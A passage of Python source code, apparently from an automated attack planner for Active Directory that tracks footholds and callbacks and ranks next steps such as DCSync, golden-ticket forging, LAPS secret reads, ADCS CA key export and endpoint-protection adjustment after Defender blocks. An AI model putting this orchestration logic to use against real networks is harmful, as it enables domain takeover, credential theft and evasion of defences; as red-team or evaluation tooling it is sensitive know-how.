    for fact in sorted(facts):
        add_from_fact(fact)

    for match in re.finditer(
        r"(?:can-read-managed-local-admin-secret|read-managed-local-admin-secret|"
        r"managed-local-admin-secret-readable|laps-read|read-laps-password):"
        r"([^\s`'\"]+)",
        _text(objective),
        re.IGNORECASE,
    ):
        add_from_fact(match.group(0).casefold(), objective_selected=True)

    required: set[tuple[str, str]] = set()
    for effect, candidates in sorted(routes.items()):
        viable = [
            candidate
            for candidate in candidates
            if not _downstream_account_route_failed(
                candidate[0],
                candidate[1],
                achieved,
                terminal_failed,
            )
        ]
        if not viable:
            continue
        selected = min(
            viable,
            key=lambda candidate: _downstream_account_route_rank(
                effect,
                candidate[0],
                candidate[1],
                achieved,
                objective_routes,
            ),
        )
        required.add(selected)
    return required


def _downstream_account_route_rank(
    effect: str,
    domain: str,
    account: str,
    achieved: set[str],
    objective_routes: set[tuple[str, str, str]],
) -> tuple[int, str, str]:
    context_prefix = f"kerberos-account-context:{account}@{domain}@callback:"
    if any(item.startswith(context_prefix) for item in achieved):
        rank = 0
    elif f"creds:{account}@{domain}" in achieved:
        rank = 1
    elif (effect, domain, account) in objective_routes:
        rank = 2
    else:
        rank = 3
    return rank, domain, account


def _downstream_account_route_failed(
    domain: str,
    account: str,
    achieved: set[str],
    terminal_failed: set[str],
) -> bool:
    credential_effect = f"creds:{account}@{domain}"
    if credential_effect in terminal_failed and credential_effect not in achieved:
        return True
    context_prefix = f"kerberos-account-context:{account}@{domain}@callback:"
    return (
        any(item.startswith(context_prefix) for item in terminal_failed)
        and not any(item.startswith(context_prefix) for item in achieved)
    )


def _account_domain_from_target(value: Any) -> tuple[str, str]:
    text = _text(value).strip()
    fields = _target_fields(text)
    account = _normalize(
        fields.get("account")
        or fields.get("user")
        or fields.get("principal")
        or fields.get("target_account")
    )
    domain = _normalize(fields.get("domain") or fields.get("realm"))
    if account and domain:
        if "\\" in account:
            account = _normalize(account.split("\\", 1)[1])
        return account, domain

    normalized = _normalize(text)
    if "@" in normalized:
        account, domain = normalized.split("@", 1)
        return _normalize(account), _normalize(domain)
    return "", ""


def _dcsync_account_target_allowed(account: str, domain: str, achieved: set[str]) -> bool:
    account = _normalize(account)
    domain = _normalize(domain)
    if not account or not domain:
        return False
    if account == "krbtgt" or account.endswith("$"):
        return False
    if f"creds:{account}@{domain}" in achieved:
        return False
    return True


_MANAGED_SECRET_READ_PREFIXES = (
    "can-read-managed-local-admin-secret:",
    "read-managed-local-admin-secret:",
    "managed-local-admin-secret-readable:",
    "laps-read:",
    "laps-read-right:",
    "read-laps-password:",
)


def _managed_local_admin_secret_targets(facts: set[str]) -> list[tuple[str, str, str, str, str]]:
    """Return graph/objective facts that say an account can read a computer's managed local admin secret."""
    targets: dict[tuple[str, str, str, str], str] = {}
    for fact in sorted(facts):
        for prefix in _MANAGED_SECRET_READ_PREFIXES:
            if not fact.startswith(prefix):
                continue
            parsed = _managed_secret_target_from_tail(fact[len(prefix):])
            if parsed:
                targets.setdefault(parsed, fact)
            break
    return [
        (account_domain, account, target_domain, target_host, source)
        for (account_domain, account, target_domain, target_host), source in sorted(targets.items())
    ]


def _managed_local_admin_secret_effect_targets(predicates: set[str]) -> list[tuple[str, str]]:
    targets: set[tuple[str, str]] = set()
    prefix = "managed-local-admin-secret:"
    for predicate in sorted(predicates):
        if not predicate.startswith(prefix):
            continue
        tail = predicate[len(prefix):]
        target, sep, domain = tail.partition("@")
        host = _normalize(_host_short(target))
        domain = _normalize(domain)
        if sep and host and domain:
            targets.add((domain, host))
    return sorted(targets)


def _local_admin_effect_targets(predicates: set[str]) -> list[tuple[str, str]]:
    targets: set[tuple[str, str]] = set()
    prefix = "local-admin:"
    for predicate in sorted(predicates):
        if not predicate.startswith(prefix):
            continue
        tail = predicate[len(prefix):]
        target, sep, domain = tail.partition("@")
        host = _normalize(_host_short(target))
        domain = _normalize(domain)
        if sep and host and domain:
            targets.add((domain, host))
    return sorted(targets)


def _remote_exec_effect_targets(predicates: set[str]) -> list[tuple[str, str]]:
    targets: set[tuple[str, str]] = set()
    prefix = "remote-exec:"
    for predicate in sorted(predicates):
        if not predicate.startswith(prefix):
            continue
        tail = predicate[len(prefix):]
        target, sep, domain = tail.partition("@")
        host = _normalize(_host_short(target))
        domain = _normalize(domain)
        if sep and host and domain:
            targets.add((domain, host))
    return sorted(targets)


def _adcs_ca_private_key_effect_targets(predicates: set[str]) -> list[tuple[str, str]]:
    targets: set[tuple[str, str]] = set()
    prefix = "adcs-ca-private-key:"
    for predicate in sorted(predicates):
        if not predicate.startswith(prefix):
            continue
        tail = predicate[len(prefix):]
        target, sep, domain = tail.partition("@")
        domain = _normalize(domain)
        host = canonical_host_for_domain(target, domain)
        if sep and host and domain:
            targets.add((domain, host))
    return sorted(targets)


def _adcs_enrolled_certificate_effect_targets(predicates: set[str]) -> list[tuple[str, str]]:
    targets: set[tuple[str, str]] = set()
    prefix = "adcs-enrolled-certificate:"
    for predicate in sorted(predicates):
        if not predicate.startswith(prefix):
            continue
        tail = predicate[len(prefix):]
        account, sep, domain = tail.partition("@")
        account = _normalize(account)
        domain = _normalize(domain)
        if sep and account and domain:
            targets.add((domain, account))
    return sorted(targets)


_CERTIFICATE_AUTH_TARGET_PREFIXES = (
    "certificate-auth-target:",
    "adcs-certificate-auth-target:",
    "pkinit-target:",
    "target-certificate-principal:",
)


def _certificate_auth_target_accounts(facts: set[str], achieved: set[str], domain: str) -> list[str]:
    domain = _normalize(domain)
    accounts: set[str] = set()
    for fact in sorted(facts):
        for prefix in _CERTIFICATE_AUTH_TARGET_PREFIXES:
            if not fact.startswith(prefix):
                continue
            account, account_domain = _account_domain_from_target(fact[len(prefix):])
            if account and account_domain == domain:
                accounts.add(account)
            break
    if not accounts:
        accounts.add("administrator")
    return sorted(
        account for account in accounts
        if account and f"certificate-auth:{account}@{domain}" not in achieved
    )


def _adcs_ca_private_key_blocked_targets(state: Any) -> set[tuple[str, str]]:
    """Targets where prior CA signing-key extraction failed for material/export reasons."""
    out: set[tuple[str, str]] = set()
    for hop in getattr(state, "hops", []) or []:
        status = _normalize(getattr(hop, "status", ""))
        if status == "achieved":
            continue
        technique = _normalize(getattr(hop, "technique", ""))
        effect = _normalize(getattr(hop, "effect", ""))
        evidence = getattr(hop, "evidence", {}) if isinstance(getattr(hop, "evidence", {}), dict) else {}
        if evidence.get("terminal_failure") is False:
            continue
        if "adcs-ca-private-key-export" not in technique and not effect.startswith("adcs-ca-private-key:"):
            continue
        evidence_text = " ".join(
            _text(value)
            for value in (
                evidence.get("verify_reason"),
                evidence.get("reason"),
                evidence.get("error"),
                evidence.get("export_error"),
                evidence.get("stdout"),
                evidence.get("stderr"),
                evidence.get("raw_output"),
                getattr(hop, "target", ""),
                effect,
            )
        ).casefold()
        explicit = any(
            evidence.get(key) is True
            for key in (
                "key_not_exportable",
                "pfx_export_failed",
                "tool_execution_failed",
                "no_ca_certificate",
                "output_not_found",
            )
        )
        textual = _has_any(
            evidence_text,
            (
                "key not exportable",
                "non-exportable private key",
                "cannot export non-exportable private key",
                "cannot export private key",
                "pfx export failed",
                "certutil backup did not produce",
                "tool execution failed",
                "system cannot execute the specified program",
                "no ca certificate",
                "output_not_found",
            ),
        )
        if not explicit and not textual:
            continue
        for candidate in (
            evidence.get("capability_target"),
            evidence.get("target"),
            getattr(hop, "target", ""),
            effect,
        ):
            fields = _target_fields(candidate)
            raw_host = (
                evidence.get("target_host")
                or evidence.get("host")
                or fields.get("target")
                or fields.get("target_host")
                or fields.get("host")
                or fields.get("computer")
            )
            host = _host_short(raw_host)
            domain = _normalize(
                evidence.get("target_domain")
                or evidence.get("domain")
                or fields.get("target_domain")
                or fields.get("domain")
            )
            if not domain and host:
                _, domain = _host_domain_from_target(candidate)
            if (not host or not domain) and "@" in _text(candidate):
                tail = _normalize(_text(candidate)).rsplit(":", 1)[-1]
                effect_host, _, effect_domain = tail.partition("@")
                raw_host = raw_host or effect_host
                host = host or _host_short(effect_host)
                domain = domain or _normalize(effect_domain)
            canonical_host = canonical_host_for_domain(raw_host or host, domain)
            if canonical_host and domain:
                out.add((domain, canonical_host))
    return out


def _managed_secret_target_from_tail(tail: Any) -> tuple[str, str, str, str] | None:
    text = _text(tail).strip()
    fields = _target_fields(text)
    account = _normalize(
        fields.get("account")
        or fields.get("user")
        or fields.get("principal")
        or fields.get("reader")
    )
    account_domain = _normalize(
        fields.get("account_domain")
        or fields.get("reader_domain")
        or fields.get("principal_domain")
        or fields.get("source_domain")
    )
    target_host = _normalize(
        fields.get("target")
        or fields.get("target_host")
        or fields.get("host")
        or fields.get("computer")
    )
    target_domain = _normalize(fields.get("target_domain") or fields.get("domain") or fields.get("realm"))

    if "@" in account and not account_domain:
        account, account_domain = _account_domain_from_target(account)
    if target_host:
        target_host, inferred_domain = _host_domain_from_target(target_host)
        if not target_domain:
            target_domain = inferred_domain

    if not (account and account_domain and target_host and target_domain):
        arrow = re.match(
            r"\s*([a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\s*(?:->|=>|:)\s*"
            r"([a-zA-Z0-9._-]+(?:\.[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})?)\s*$",
            text,
            re.IGNORECASE,
        )
        if arrow:
            account, account_domain = _account_domain_from_target(arrow.group(1))
            target_host, target_domain = _host_domain_from_target(arrow.group(2))

    account = _normalize(account)
    account_domain = _normalize(account_domain)
    target_host = _normalize(_host_short(target_host))
    target_domain = _normalize(target_domain)
    if not (account and account_domain and target_host and target_domain):
        return None
    return account_domain, account, target_domain, target_host


def _admin_domain_effects(predicates: set[str], known_domains: set[str] | None = None) -> dict[str, str]:
    """Map canonical action domains to the exact DA/EA predicates that proved them."""
    known = {_normalize(domain) for domain in (known_domains or set()) if _normalize(domain)}
    domains: dict[str, str] = {}
    for predicate in predicates:
        for prefix in ("da:", "ea:"):
            if predicate.startswith(prefix):
                domain = predicate[len(prefix):].strip()
                if domain:
                    resolved = domain
                    if "." not in domain:
                        matches = {
                            candidate
                            for candidate in known
                            if "." in candidate and candidate.split(".", 1)[0] == domain
                        }
                        if len(matches) == 1:
                            resolved = next(iter(matches))
                    domains.setdefault(resolved, predicate)
    return domains


def _admin_domains(predicates: set[str], known_domains: set[str] | None = None) -> set[str]:
    return set(_admin_domain_effects(predicates, known_domains))


def _admin_dcsync_context_gate(
    domain: str,
    state: Any,
    achieved: set[str],
    live_callback_ids: set[str],
    explicit_replication_domains: set[str],
    admin_effects: dict[str, str],
    *,
    preferred_callback_id: str = "",
    terminal_failed: set[str] | None = None,
) -> tuple[str, list[CapabilityAction], bool]:
    """Return the callback context or prerequisite actions required before admin-backed DCSync.

    A graph refresh can project the Domain Admins DCSync edge immediately after membership is verified, before
    the active callback's Kerberos PAC is refreshed. Same-domain admin authority therefore still needs a proven
    callback-scoped context even when a graph fact now also names replication rights. Direct graph-only
    replication rights without a matching admin effect remain immediately usable.
    """
    if domain not in admin_effects:
        return "", [], False
    context_callback = _current_kerberos_context_callback(domain, state, live_callback_ids)
    if context_callback:
        return context_callback, [], True
    same_domain_callbacks = _live_callback_ids_for_domain(state, domain)
    if same_domain_callbacks:
        return "", _refresh_kerberos_context_actions(
            domain,
            same_domain_callbacks,
            authorization_effect=admin_effects.get(domain, f"da:{domain}"),
            preferred_callback_id=preferred_callback_id,
            terminal_failed=terminal_failed,
        ), True
    return "", _ensure_kerberos_context_actions(
        domain,
        achieved,
        live_callback_ids,
        preferred_callback_id=preferred_callback_id,
        terminal_failed=terminal_failed,
    ), True


def _ensure_kerberos_context_actions(
    target_domain: str,
    achieved: set[str],
    live_callback_ids: set[str],
    *,
    preferred_callback_id: str = "",
    terminal_failed: set[str] | None = None,
) -> list[CapabilityAction]:
    target_domain = _normalize(target_domain)
    if not target_domain or not live_callback_ids:
        return []
    source_domains = {
        domain
        for domain in _krbtgt_hash_domains(achieved)
        if domain == target_domain or _parent_domain(domain) == target_domain
    }
    if not source_domains:
        return []
    callback_id = _select_context_callback_id(
        live_callback_ids,
        preferred_callback_id,
        terminal_failed=terminal_failed,
        effect_for_callback=lambda candidate: _kerberos_context_effect(target_domain, candidate),
    )
    if not callback_id:
        return []
    out: list[CapabilityAction] = []
    for source_domain in sorted(source_domains, key=lambda item: (item != target_domain, item)):
        out.append(_ensure_kerberos_context_action(source_domain, target_domain, callback_id))
    return out


def _refresh_kerberos_context_actions(
    target_domain: str,
    live_callback_ids: set[str],
    authorization_effect: str = "",
    *,
    preferred_callback_id: str = "",
    terminal_failed: set[str] | None = None,
) -> list[CapabilityAction]:
    target_domain = _normalize(target_domain)
    if not target_domain or not live_callback_ids:
        return []
    callback_id = _select_context_callback_id(
        live_callback_ids,
        preferred_callback_id,
        terminal_failed=terminal_failed,
        effect_for_callback=lambda candidate: _kerberos_context_effect(target_domain, candidate),
    )
    if not callback_id:
        return []
    return [
        _refresh_kerberos_context_action(
            target_domain,
            callback_id,
            authorization_effect=authorization_effect,
        )
    ]


def _live_kerberos_context_callback(
    domain: str,
    achieved: set[str],
    live_callback_ids: set[str],
) -> str:
    domain = _normalize(domain)
    for effect in sorted(achieved):
        parsed = _parse_kerberos_context_effect(effect)
        if not parsed:
            continue
        context_domain, callback_id = parsed
        if context_domain == domain and callback_id in live_callback_ids:
            return callback_id
    return ""


def _current_kerberos_context_callback(
    domain: str,
    state: Any,
    live_callback_ids: set[str],
) -> str:
    domain = _normalize(domain)
    if not domain or not live_callback_ids:
        return ""
    seen_callbacks: set[str] = set()
    for hop in reversed(list(getattr(state, "hops", []) or [])):
        if _normalize(getattr(hop, "status", "")) != "achieved":
            continue
        effects = list(getattr(hop, "satisfied_effects", []) or [])
        if not effects:
            effects = [getattr(hop, "effect", "")]
        for effect in effects:
            parsed = _parse_kerberos_context_effect(effect)
            if not parsed:
                continue
            context_domain, callback_id = parsed
            if callback_id not in live_callback_ids or callback_id in seen_callbacks:
                continue
            seen_callbacks.add(callback_id)
            if context_domain == domain:
                return callback_id
    return ""


def _live_account_kerberos_context_callbacks(
    achieved: set[str],
    live_callback_ids: set[str],
    domain: str,
    account: str,
) -> list[str]:
    domain = _normalize(domain)
    account = _normalize(account)
    out: set[str] = set()
    for effect in sorted(achieved):
        parsed = _parse_kerberos_account_context_effect(effect)
        if not parsed:
            continue
        context_domain, context_account, callback_id = parsed
        if context_domain == domain and context_account == account and callback_id in live_callback_ids:
            out.add(callback_id)
    return sorted(out)


def _endpoint_protection_blocked_targets(state: Any) -> set[tuple[str, str]]:
    """Targets with explicit endpoint-control blocker evidence in failed/blocked hops."""
    out: set[tuple[str, str]] = set()
    for hop in getattr(state, "hops", []) or []:
        status = _normalize(getattr(hop, "status", ""))
        if status == "achieved":
            continue
        evidence = getattr(hop, "evidence", {}) if isinstance(getattr(hop, "evidence", {}), dict) else {}
        evidence_text = " ".join(
            _text(value)
            for value in (
                evidence.get("verify_reason"),
                evidence.get("reason"),
                evidence.get("error"),
                evidence.get("stderr"),
                evidence.get("stdout"),
                evidence.get("raw_output"),
                evidence.get("command"),
                getattr(hop, "effect", ""),
                getattr(hop, "target", ""),
            )
        ).casefold()
        explicit = any(
            evidence.get(key) is True
            for key in (
                "defender_blocked",
                "payload_quarantined",
                "endpoint_blocked",
                "endpoint_protection_blocked",
            )
        )
        textual = _has_any(
            evidence_text,
            (
                "defender",
                "windows defender",
                "microsoft defender",
                "quarantined",
                "threat removed",
                "malware",
                "blocked by endpoint",
                "killed by endpoint",
            ),
        )
        if not explicit and not textual:
            continue
        for candidate in (
            evidence.get("capability_target"),
            evidence.get("target"),
            getattr(hop, "target", ""),
            getattr(hop, "effect", ""),
        ):
            fields = _target_fields(candidate)
            host = _host_short(
                evidence.get("target_host")
                or evidence.get("host")
                or fields.get("target")
                or fields.get("target_host")
                or fields.get("host")
                or fields.get("computer")
            )
            domain = _normalize(
                evidence.get("target_domain")
                or evidence.get("domain")
                or fields.get("target_domain")
                or fields.get("domain")
            )
            if not domain and host:
                _, domain = _host_domain_from_target(candidate)
            if (not host or not domain) and "@" in _text(candidate):
                tail = _normalize(_text(candidate)).rsplit(":", 1)[-1]
                effect_host, _, effect_domain = tail.partition("@")
                host = host or _host_short(effect_host)
                domain = domain or _normalize(effect_domain)
            if host and domain:
                out.add((domain, host))
    return out


def _kerberos_context_effect(domain: str, callback_id: str) -> str:
    return f"kerberos-context:{_normalize(domain)}@callback:{_normalize_callback_id(callback_id)}"


def _kerberos_account_context_effect(domain: str, account: str, callback_id: str) -> str:
    return (
        f"kerberos-account-context:{_normalize(account)}@{_normalize(domain)}"
        f"@callback:{_normalize_callback_id(callback_id)}"
    )


def _managed_local_admin_secret_effect(target_host: str, target_domain: str) -> str:
    return f"managed-local-admin-secret:{_normalize(_host_short(target_host))}@{_normalize(target_domain)}"


def _local_admin_effect(target_host: str, target_domain: str) -> str:
    return f"local-admin:{_normalize(_host_short(target_host))}@{_normalize(target_domain)}"


def _remote_exec_effect(target_host: str, target_domain: str) -> str:
    return f"remote-exec:{_normalize(_host_short(target_host))}@{_normalize(target_domain)}"


def _endpoint_protection_adjusted_effect(target_host: str, target_domain: str) -> str:
    return f"endpoint-protection-adjusted:{_normalize(_host_short(target_host))}@{_normalize(target_domain)}"


def _adcs_ca_private_key_effect(target_host: str, target_domain: str) -> str:
    host = canonical_host_for_domain(target_host, target_domain)
    domain = _normalize(target_domain)
    return f"adcs-ca-private-key:{host}@{domain}" if host and domain else ""


def _adcs_enrolled_certificate_effect(account: str, target_domain: str) -> str:
    return f"adcs-enrolled-certificate:{_normalize(account)}@{_normalize(target_domain)}"


def _parse_kerberos_context_effect(effect: str) -> tuple[str, str] | None:
    normalized = _normalize(effect)
    prefix = "kerberos-context:"
    marker = "@callback:"
    if not normalized.startswith(prefix):
        return None
    domain, sep, callback_id = normalized[len(prefix):].partition(marker)
    if not sep:
        return None
    domain = domain.strip()
    callback_id = _normalize_callback_id(callback_id)
    if not domain or not callback_id:
        return None
    return domain, callback_id


def _parse_kerberos_account_context_effect(effect: str) -> tuple[str, str, str] | None:
    normalized = _normalize(effect)
    prefix = "kerberos-account-context:"
    marker = "@callback:"
    if not normalized.startswith(prefix):
        return None
    principal, sep, callback_id = normalized[len(prefix):].partition(marker)
    if not sep:
        return None
    account, domain = _account_domain_from_target(principal)
    callback_id = _normalize_callback_id(callback_id)
    if not account or not domain or not callback_id:
        return None
    return domain, account, callback_id


def _parent_domain(domain: str) -> str:
    parts = [part for part in _normalize(domain).split(".") if part]
    if len(parts) > 2:
        return ".".join(parts[1:])
    return _normalize(domain)


def _legacy_gpo_downstream_effect_proves_progress(gpo: str, domain: str, achieved: set[str]) -> bool:
    if f"system:{gpo}" not in achieved:
        return False
    return _gpo_downstream_effect_proves_progress(domain, achieved)


def _gpo_downstream_effect_proves_progress(domain: str, achieved: set[str]) -> bool:
    if any(
        effect in achieved
        for effect in (
            f"ds-replication-rights:{domain}",
            f"krbtgt-hash:{domain}",
            f"da:{domain}",
            f"ea:{domain}",
        )
    ):
        return True
    return any(
        _domains_equivalent(domain, effect.split(":", 1)[1])
        for effect in achieved
        if effect.startswith(("da:", "ea:")) and ":" in effect
    )


def _domains_equivalent(a: str, b: str) -> bool:
    a = _normalize(a)
    b = _normalize(b)
    if not a or not b:
        return False
    if a == b:
        return True
    if "." not in a and "." in b:
        return a == b.split(".", 1)[0]
    if "." not in b and "." in a:
        return b == a.split(".", 1)[0]
    return False


_GPO_CONTROL_PREFIXES = (
    "generic-write:gpo:",
    "generic-all:gpo:",
    "write-dacl:gpo:",
    "write-owner:gpo:",
    "owns:gpo:",
)


def _graph_fact_predicates(state: Any) -> set[str]:
    predicates: set[str] = set()
    for graph_fact in getattr(state, "graph_facts", []) or []:
        predicate = _normalize(getattr(graph_fact, "predicate", ""))
        if predicate:
            predicates.add(predicate)
    predicates.update(_structured_guidance_predicates(getattr(state, "objective", "")))
    return predicates


def _structured_guidance_predicates(text: Any) -> set[str]:
    """Extract explicit fact predicates embedded in operator guidance.

    This is intentionally structured: free-form prose does not mint facts, but
    guided evals can provide graph-equivalent predicates without hardcoding a
    range path into the capability system.
    """
    source = _text(text)
    if not source:
        return set()
    prefixes = (
        *_CREDENTIAL_TARGET_PREFIXES,
        *_MANAGED_SECRET_READ_PREFIXES,
        *_CERTIFICATE_AUTH_TARGET_PREFIXES,
    )
    prefix_re = "|".join(re.escape(prefix) for prefix in prefixes)
    facts: set[str] = set()
    for match in re.finditer(rf"(?i)(?:^|[\s`'\"])((?:{prefix_re})[^\s`'\",]+)", source):
        fact = _normalize(match.group(1).rstrip(".).]};"))
        if fact:
            facts.add(fact)
    return facts


def _live_foothold_domains(state: Any) -> set[str]:
    domains: set[str] = set()
    for foothold in getattr(state, "footholds", []) or []:
        if not _is_live_target_callback_foothold(foothold):
            continue
        forest = _normalize(getattr(foothold, "forest", ""))
        if forest:
            domains.add(forest)
        identity_domain = _identity_domain(getattr(foothold, "identity", ""))
        if identity_domain:
            domains.add(identity_domain)
    return domains


def _live_callback_ids_for_domain(state: Any, domain: str) -> set[str]:
    target_domain = _normalize(domain)
    callback_ids: set[str] = set()
    if not target_domain:
        return callback_ids
    for foothold in getattr(state, "footholds", []) or []:
        if not _is_live_target_callback_foothold(foothold):
            continue
        callback_id = _normalize_callback_id(getattr(foothold, "callback_id", ""))
        if not callback_id:
            continue
        domains = {
            _normalize(getattr(foothold, "forest", "")),
            _identity_domain(getattr(foothold, "identity", "")),
        }
        if any(_domains_equivalent(target_domain, candidate) for candidate in domains if candidate):
            callback_ids.add(callback_id)
    return callback_ids


def _live_callback_ids(state: Any) -> set[str]:
    callback_ids: set[str] = set()
    for foothold in getattr(state, "footholds", []) or []:
        if not _is_live_target_callback_foothold(foothold):
            continue
        callback_id = _normalize_callback_id(getattr(foothold, "callback_id", ""))
        if callback_id:
            callback_ids.add(callback_id)
    return callback_ids


def _live_foothold_account_context_effects(state: Any) -> set[str]:
    """Return current callback account contexts implied by live authenticated footholds."""
    effects: set[str] = set()
    for foothold in getattr(state, "footholds", []) or []:
        if not _is_live_target_callback_foothold(foothold):
            continue
        callback_id = _normalize_callback_id(getattr(foothold, "callback_id", ""))
        domain = _normalize(getattr(foothold, "forest", ""))
        account = _identity_account_for_forest(
            getattr(foothold, "identity", ""),
            domain,
        )
        if callback_id and domain and account:
            effects.add(_kerberos_account_context_effect(domain, account, callback_id))
    return effects


def _preferred_live_callback_id(state: Any, live_callback_ids: set[str]) -> str:
    """Return the latest live callback that actually proved an achieved hop.

    Candidate generation may expose equivalent callback-scoped actions for several
    live footholds. Keep the controller on the callback that most recently advanced
    the ledger unless that callback is no longer live; this is an ordering hint, not
    a hard gate, so older live callbacks remain available as fallbacks.
    """
    if not live_callback_ids:
        return ""
    for hop in reversed(list(getattr(state, "hops", []) or [])):
        if _normalize(getattr(hop, "status", "")) != "achieved":
            continue
        evidence = getattr(hop, "evidence", {}) if isinstance(getattr(hop, "evidence", {}), dict) else {}
        candidates = [
            evidence.get("callback_id"),
            _target_fields(getattr(hop, "target", "")).get("callback"),
            _target_fields(getattr(hop, "target", "")).get("callback_id"),
        ]
        effects = list(getattr(hop, "satisfied_effects", []) or [])
        if not effects:
            effects = [getattr(hop, "effect", "")]
        for effect in effects:
            parsed_context = _parse_kerberos_context_effect(effect)
            if parsed_context:
                candidates.append(parsed_context[1])
            parsed_account_context = _parse_kerberos_account_context_effect(effect)
            if parsed_account_context:
                candidates.append(parsed_account_context[2])
        for candidate in candidates:
            callback_id = _normalize_callback_id(candidate)
            if callback_id in live_callback_ids:
                return callback_id
    return ""


def _select_context_callback_id(
    callback_ids: set[str],
    preferred_callback_id: str = "",
    *,
    terminal_failed: set[str] | None = None,
    effect_for_callback: Callable[[str], str] | None = None,
) -> str:
    """Pick one callback lane for a callback-scoped context effect.

    A context on one live callback is enough to advance the next capability. Do
    not manufacture equivalent context work on every callback; keep the active
    lane until it is unavailable, then expose a deterministic fallback.
    """
    failed = terminal_failed or set()
    preferred_callback_id = _normalize_callback_id(preferred_callback_id)
    ordered = sorted(
        {_normalize_callback_id(item) for item in callback_ids if _normalize_callback_id(item)},
        key=lambda callback_id: (callback_id != preferred_callback_id, callback_id),
    )
    for callback_id in ordered:
        if effect_for_callback is not None and effect_for_callback(callback_id) in failed:
            continue
        return callback_id
    return ""


def _is_live_target_callback_foothold(foothold: Any) -> bool:
    if getattr(foothold, "alive", False) is not True:
        return False
    agent = _normalize(getattr(foothold, "agent", ""))
    return agent != "sage"


def _achieved_effects(state: Any) -> set[str]:
    try:
        return {_canonical_effect(item) for item in state.achieved_effects() if _canonical_effect(item)}
    except Exception:
        return set()


def _terminal_failed_effects(state: Any) -> set[str]:
    effects: set[str] = set()
    try:
        hops = list(getattr(state, "hops", []) or [])
    except Exception:
        return effects
    for hop in hops:
        status = _normalize(getattr(hop, "status", ""))
        if status not in {"failed", "blocked"}:
            continue
        evidence = getattr(hop, "evidence", {})
        if isinstance(evidence, dict) and evidence.get("terminal_failure") is False:
            continue
        effect = _canonical_effect(getattr(hop, "effect", ""))
        if effect:
            effects.add(effect)
        try:
            for item in list(getattr(hop, "satisfied_effects", []) or []):
                canonical = _canonical_effect(item)
                if canonical:
                    effects.add(canonical)
        except Exception:
            pass
    return effects


def _canonical_effect(effect: Any) -> str:
    normalized = _normalize(effect)
    if not normalized.startswith("creds:"):
        return normalized
    tail = normalized[len("creds:"):]
    if "@" not in tail:
        return normalized
    account, domain = tail.rsplit("@", 1)
    if "\\" in account:
        account = account.rsplit("\\", 1)[1]
    if "@" in account:
        account = account.split("@", 1)[0]
    account = _normalize(account)
    domain = _normalize(domain)
    if not account or not domain:
        return normalized
    return f"creds:{account}@{domain}"


def _dedupe_actions(actions: list[CapabilityAction]) -> list[CapabilityAction]:
    out: list[CapabilityAction] = []
    seen: set[tuple[str, str]] = set()
    for action in actions:
        key = (action.name, action.target)
        if key in seen:
            continue
        seen.add(key)
        out.append(action)
    return out


def _capability_action_priority(action: CapabilityAction) -> int:
    order = {
        "adcs-certificate-auth": 5,
        "gpo-controlled-system-exec": 10,
        "grant-directory-rights": 20,
        "dcsync-krbtgt": 30,
        "forge-golden-ticket": 32,
        "dcsync-account": 35,
        "ensure-kerberos-context": 50,
        "ensure-account-kerberos-context": 55,
        "read-managed-local-admin-secret": 60,
        "use-managed-local-admin-secret": 70,
        "execute-as-local-admin": 80,
        "endpoint-protection-adjustment": 90,
        "adcs-ca-private-key-export": 100,
        "adcs-esc-certificate-enroll": 110,
    }
    return order.get(_normalize(getattr(action, "name", "")), 1000)


def _capability_action_sort_key(action: CapabilityAction, preferred_callback_id: str = "") -> tuple[Any, ...]:
    callback_id = _action_callback_id(action)
    affinity_rank = 0
    if preferred_callback_id and callback_id and callback_id != preferred_callback_id:
        affinity_rank = 1
    return (_capability_action_priority(action), action.name, affinity_rank, action.target)


def _action_callback_id(action: CapabilityAction) -> str:
    intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
    fields = _target_fields(getattr(action, "target", ""))
    for candidate in (
        intent.get("callback_id"),
        intent.get("callback"),
        fields.get("callback"),
        fields.get("callback_id"),
    ):
        callback_id = _normalize_callback_id(candidate)
        if callback_id:
            return callback_id
    for effect in list(getattr(action, "effects", []) or []):
        parsed_context = _parse_kerberos_context_effect(effect)
        if parsed_context:
            return parsed_context[1]
        parsed_account_context = _parse_kerberos_account_context_effect(effect)
        if parsed_account_context:
            return parsed_account_context[2]
    return ""


def _normalize_callback_id(value: Any) -> str:
    return _normalize(value).lstrip("#")


def _identity_domain(identity: Any) -> str:
    text = _text(identity)
    if "\\" in text:
        return _normalize(text.split("\\", 1)[0])
    if "@" in text:
        return _normalize(text.rsplit("@", 1)[1])
    return ""


def _identity_account(identity: Any) -> str:
    text = _text(identity).strip()
    normalized = _normalize(text)
    if not normalized or normalized in {"sage", "system", "nt authority\\system"}:
        return ""
    if "\\" in text:
        return _normalize(text.rsplit("\\", 1)[1])
    if "@" in text:
        return _normalize(text.split("@", 1)[0])
    return normalized


def _identity_account_for_forest(identity: Any, forest: Any) -> str:
    """Return the callback account only when an explicit identity domain matches its forest."""
    account = _identity_account(identity)
    forest_domain = _normalize(forest)
    if not account or not forest_domain:
        return ""
    identity_domain = _identity_domain(identity)
    if identity_domain and not _domains_equivalent(identity_domain, forest_domain):
        return ""
    return account


def _any_true(probe_result: dict[str, Any], keys) -> bool:
    return any(probe_result.get(key) is True for key in keys)


def _first_true(probe_result: dict[str, Any], keys) -> str:
    for key in keys:
        if probe_result.get(key) is True:
            return key
    return ""


def _selected_probe(probe_result: dict[str, Any]) -> dict[str, Any]:
    return {
        key: value
        for key, value in probe_result.items()
        if isinstance(value, (bool, int, float, str)) and key != "raw_output"
    }


def _first_output_field(text: str, field: str) -> str:
    pattern = re.compile(rf"(?im)^\s*{re.escape(field)}\s*[:=]\s*(.*?)\s*$")
    for match in pattern.finditer(_text(text)):
        value = match.group(1).strip()
        if value:
            return value
    return ""


def _first_multiline_base64_after(text: str, label_pattern: str) -> str:
    pattern = re.compile(rf"(?is){label_pattern}\s*:\s*(?P<body>.+)")
    match = pattern.search(_text(text))
    if not match:
        return ""
    lines = []
    for line in match.group("body").splitlines():
        stripped = line.strip().strip('"').strip("'")
        if not stripped:
            if lines:
                break
            continue
        if re.search(r"^\[|^\(|^SAGE OPSEC|^SAGE_", stripped, re.IGNORECASE):
            break
        if re.fullmatch(r"[A-Za-z0-9+/=\\/\s]+", stripped):
            lines.append(stripped)
            continue
        if lines:
            break
    candidate = re.sub(r"\s+", "", "".join(lines)).replace("\\/", "/")
    if len(candidate) < 64:
        return ""
    try:
        base64.b64decode(candidate, validate=True)
    except Exception:
        return ""
    return candidate


